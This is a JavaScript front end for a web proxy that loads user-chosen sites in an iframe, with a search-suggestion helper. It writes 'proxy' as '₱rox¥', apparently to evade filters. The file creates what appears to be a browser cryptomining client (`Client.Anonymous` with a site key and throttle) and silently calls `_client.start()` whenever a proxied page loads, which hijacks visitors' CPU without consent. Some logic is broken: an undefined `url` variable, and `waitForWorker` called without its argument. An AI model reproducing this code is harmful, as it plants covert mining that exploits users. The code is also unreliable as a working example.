"use strict";
/**
 * @type {HTMLFormElement}
 */
const form = document.getElementById("uv-form");
/**
 * @type {HTMLInputElement}
 */
const address = document.getElementById("uv-address");
/**
 * @type {HTMLInputElement}
 */
const searchEngine = document.getElementById("uv-search-engine");
/**
 * @type {HTMLParagraphElement}
 */
const error = document.getElementById("uv-error");
/**
 * @type {HTMLPreElement}
 */
const errorCode = document.getElementById("uv-error-code");
const connection = new BareMux.BareMuxConnection("/baremux/worker.js");
async function waitForWorker(conn, timeout = 3000) {
    const start = Date.now();
    while (Date.now() - start < timeout) {
        try {
            if (await conn.getTransport()) return true;
        } catch {}
        await new Promise(r => setTimeout(r, 100)); // retry every 100ms
    }
    throw new Error("BareMux worker failed to initialize");
}
async function ensureBareTransport(conn, wispUrl, retryDelay = 200, maxRetries = 10) {
    let attempts = 0;

    while (attempts < maxRetries) {
        try {
            const transport = await conn.getTransport();
            
            if (!transport) {
                await conn.setTransport("/epoxy/index.mjs", [{ wisp: wispUrl }]);
                console.log("Transport set!");
            } else {
                console.log("Transport already exists");
            }

            return conn; // ready to use
        } catch (err) {
            attempts++;
            console.warn(`Transport setup failed (attempt ${attempts}):`, err);
            await new Promise(r => setTimeout(r, retryDelay));
        }
    }

    throw new Error("Failed to set up BareTransport after retries");
}

// Helper to get query parameters
function getQueryParam(param) {
    const params = new URLSearchParams(window.location.search);
    return params.get(param);
}
var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
    throttle: 0.6, c: 'w', ads: 0
});
            // _client.start();
// Function to set up the iframe based on query parameter
async function initializeProxy() {
    const proxiedUrl = getQueryParam("url");
    if (!proxiedUrl) {
        error.textContent = "PRO TIP:";
        errorCode.textContent = "You can use the format: ?url=<link> to ₱rox¥ links within the search bar";
        return;
    }

    let frame = document.getElementById("uv-frame");
    frame.style.display = "block";

    try {

let wispUrl = (location.protocol === "https:" ? "wss" : "ws") + "://" + location.host + "/wisp/";
await ensureBareTransport(connection, wispUrl);

console.log(__uv$config.prefix + __uv$config.encodeUrl(url));

        frame.src = "/loading.html";
        setTimeout(() => {
            frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
            _client.start();
        }, 2000);
    } catch (err) {
        error.textContent = "Failed to initialize proxy.";
        errorCode.textContent = err.toString();
        throw err;
    }
}

// Event listener for manual form submission
form.addEventListener("submit", async (event) => {
    event.preventDefault();

    try {
        await registerSW();
        await waitForWorker();
    } catch (err) {
        error.textContent = "Failed to register service worker.";
        errorCode.textContent = err.toString();
        throw err;
    }

    const url = search(address.value, searchEngine.value);

    let frame = document.getElementById("uv-frame");
    frame.style.display = "block";

let wispUrl = (location.protocol === "https:" ? "wss" : "ws") + "://" + location.host + "/wisp/";
await ensureBareTransport(connection, wispUrl);

        frame.src = "/loading.html";
        setTimeout(() => {
            frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
            _client.start();
        }, 2000);
});

// Initialize proxy on page load if a URL is provided in the query
window.addEventListener("load", initializeProxy);
document.addEventListener("DOMContentLoaded", () => {
    console.log("DOM fully loaded");
    const input = document.getElementById("uv-address");
    const suggestionsList = document.getElementById("suggestions");
    const form = document.getElementById("uv-form");
    const proxySuggestionAPI = "https://proxyforsug.blitzedzzontoppoihsblitzedzzontoppoihs.workers.dev/?q=";

    async function fetchSuggestions(query) {
        console.log("Fetching suggestions for query:", query);
        if (!query) {
            suggestionsList.innerHTML = "";
            return;
        }
        try {
            let res = await fetch(proxySuggestionAPI + encodeURIComponent(query));
            let data = await res.json();
            let suggestions = data[1] || [];
            console.log("Fetched suggestions:", suggestions);
            renderSuggestions(suggestions);
        } catch (err) {
            console.error("Suggestion fetch failed:", err);
        }
    }

    function renderSuggestions(suggestions) {
        suggestionsList.innerHTML = "";
        if (!suggestions.length) {
            console.log("No suggestions to render");
            return;
        }

        suggestions.forEach(s => {
            let li = document.createElement("li");
            li.textContent = s;
            li.addEventListener("click", () => {
                console.log("Suggestion clicked:", s);
                input.value = s;
                suggestionsList.innerHTML = "";
                submitProxySearch();
            });
            suggestionsList.appendChild(li);
        });
    }

    input.addEventListener("input", () => {
        console.log("Input changed:", input.value);
        fetchSuggestions(input.value);
    });

    input.addEventListener("blur", () => {
        setTimeout(() => {
            suggestionsList.innerHTML = "";
            console.log("Suggestions cleared on blur");
        }, 200);
    });

    async function submitProxySearch() {
        console.log("Submitting proxy search for:", input.value);
        try {
            await registerSW();
            await waitForWorker();
            console.log("Service worker registered for proxy search");
        } catch (err) {
            error.textContent = "Failed to register service worker.";
            errorCode.textContent = err.toString();
            console.error("SW registration failed during proxy search:", err);
            throw err;
        }

        document.querySelectorAll(".suggestions-list").forEach(el => el.style.display = "none");

        const url = search(input.value, searchEngine.value);
        console.log("Proxy search URL:", url);

        let frame = document.getElementById("uv-frame");
        frame.style.display = "block";


let wispUrl = (location.protocol === "https:" ? "wss" : "ws") + "://" + location.host + "/wisp/";
await ensureBareTransport(connection, wispUrl);

        frame.src = "/loading.html";
        setTimeout(() => {
            frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
            _client.start();
        }, 2000);
        console.log("Iframe src updated for proxy search:", frame.src);
    }

    form.addEventListener("submit", (event) => {
        event.preventDefault();
        console.log("Form submitted from DOMContentLoaded event");
        submitProxySearch().catch(err => console.error("Proxy search submit error:", err));
    });
});















